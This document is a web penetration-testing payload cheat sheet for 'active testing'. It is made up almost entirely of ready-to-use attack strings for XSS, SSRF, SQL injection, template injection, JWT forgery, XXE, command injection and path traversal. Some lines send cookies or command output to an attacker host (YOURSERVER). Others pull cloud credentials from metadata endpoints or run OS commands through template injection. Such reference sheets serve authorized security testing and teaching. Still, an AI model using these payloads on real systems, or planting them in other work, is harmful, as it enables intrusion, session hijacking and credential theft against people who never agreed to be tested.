# Payload Quick Reference

> Fast lookup for common payloads during active testing.  
> Organized by context and purpose.

---

## XSS Payloads

### Basic Detection
```javascript
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
javascript:alert(1)
"><script>alert(1)</script>
'><script>alert(1)</script>
```

### Attribute Context
```javascript
" onmouseover="alert(1)
' onmouseover='alert(1)
" autofocus onfocus="alert(1)
" onclick="alert(1)
```

### Filter Bypass
```javascript
<ScRiPt>alert(1)</ScRiPt>           <!-- case variation -->
<script>alert`1`</script>            <!-- template literal -->
<img src=x onerror="&#97;lert(1)">  <!-- HTML entity -->
<svg><script>alert(1)</script></svg>
<iframe srcdoc="<script>alert(1)</script>">
eval(atob('YWxlcnQoMSk='))          <!-- base64: alert(1) -->
```

### Session Theft (use only in PoC, document account info)
```javascript
<script>document.location='https://YOURSERVER/?c='+document.cookie</script>
<img src=x onerror="fetch('https://YOURSERVER/?c='+btoa(document.cookie))">
```

### DOM XSS Sinks to Check
- `innerHTML`, `outerHTML`
- `document.write()`, `document.writeln()`
- `eval()`, `setTimeout()`, `setInterval()`
- `location.href`, `location.replace()`
- jQuery: `$()`

---

## SSRF Payloads

### Internal Targets
```
http://127.0.0.1/
http://localhost/
http://0.0.0.0/
http://[::1]/
http://0/
http://①②⑦.⓪.⓪.①/    <!-- unicode bypass -->
```

### Cloud Metadata
```
# AWS IMDSv1
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/

# GCP
http://metadata.google.internal/computeMetadata/v1/?recursive=true
http://169.254.169.254/computeMetadata/v1/

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-01-01
```

### IP Bypass Variants (for 127.0.0.1)
```
2130706433          (decimal)
0x7f000001          (hex)
0177.0.0.1          (octal)
127.0.0.1           (standard)
127.1               (short)
127.000.000.001     (padded)
127.0.0.1.nip.io    (DNS rebind via nip.io)
```

### Protocol Variants
```
file:///etc/passwd
dict://127.0.0.1:6379/info
gopher://127.0.0.1:6379/_INFO%0D%0A
```

---

## IDOR Test Patterns

### ID Manipulation
```
# Numeric: change value
/api/users/100  →  /api/users/99, /api/users/101

# UUID: swap with victim's UUID
/api/users/a1b2c3d4-e5f6-...  →  victim's UUID

# Encoded: decode, change, re-encode
base64: dXNlcl8xMDA=  →  decode  →  "user_100"  →  change  →  re-encode
```

### HTTP Method Switching
```
GET    /api/resource/VICTIM_ID  → 403
POST   /api/resource/VICTIM_ID  → 200?
DELETE /api/resource/VICTIM_ID  → 200?
```

### Parameter Pollution
```
?user_id=MINE&user_id=VICTIM
body: {"user_id": "MINE", "user_id": "VICTIM"}
```

---

## SQL Injection Detection

### Basic Error-Based
```sql
'
''
`
`)
'))
" OR 1=1--
' OR '1'='1
' OR 1=1--
' OR 1=1#
1; SELECT SLEEP(5)--
1' AND SLEEP(5)--
```

### Boolean-Based Blind
```sql
' AND 1=1--    (true condition - same response)
' AND 1=2--    (false condition - different response)
' AND substring(username,1,1)='a'--
```

### Time-Based Blind
```sql
# MySQL
' AND SLEEP(5)--
1; WAITFOR DELAY '0:0:5'--

# PostgreSQL
'; SELECT pg_sleep(5)--

# MSSQL
'; WAITFOR DELAY '00:00:05'--
```

### Union-Based (find column count first)
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY N--   (until error = N-1 columns)

' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--  (match column count)
```

---

## SSTI Detection

### Universal Detection
```
{{7*7}}          → 49?  (Jinja2, Twig)
${7*7}           → 49?  (Freemarker, Velocity)
<%= 7*7 %>       → 49?  (ERB)
#{7*7}           → 49?  (Ruby)
*{7*7}           → 49?  (Spring EL)
```

### Jinja2 (Python) Exploitation
```python
{{config.items()}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Twig (PHP) Exploitation
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

---

## JWT Attacks

### Decode (no library needed)
```bash
# Paste JWT → https://jwt.io
# Or manually:
echo "PAYLOAD_PART" | base64 -d
```

### alg:none Attack
```python
import base64, json

header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({"user_id":1,"role":"admin"}).encode()).rstrip(b'=')
token = f"{header.decode()}.{payload.decode()}."   # empty signature
```

### Weak Secret Brute Force
```bash
hashcat -a 0 -m 16500 {jwt_token} /usr/share/wordlists/rockyou.txt
```

---

## Open Redirect Payloads

```
https://evil.com
//evil.com
\/\/evil.com
https:evil.com
javascript:alert(1)         # if XSS chaining
https://target.com.evil.com # subdomain confusion
https://evil.com%23target.com
```

---

## XXE Payloads

### Basic File Read
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### SSRF via XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>
```

### Blind XXE (out-of-band)
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % ext SYSTEM "http://YOURSERVER/evil.dtd">
  %ext;
]>
<root>&send;</root>
```

---

## Command Injection

### Basic Detection
```bash
; id
| id
&& id
` id `
$(id)
; sleep 5
| sleep 5
&& sleep 5
```

### Blind (time-based)
```bash
; sleep 10
| timeout 10
& ping -c 10 127.0.0.1
```

### Out-of-band
```bash
; curl http://YOURSERVER/$(id)
; nslookup $(id).YOURSERVER
```

---

## Path Traversal

```
../../../etc/passwd
..\..\..\windows\win.ini
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd   (URL encoded)
....//....//....//etc/passwd               (double-slash bypass)
..%252f..%252fetc%252fpasswd               (double URL encoded)
/etc/passwd%00.jpg                          (null byte — old PHP)
```
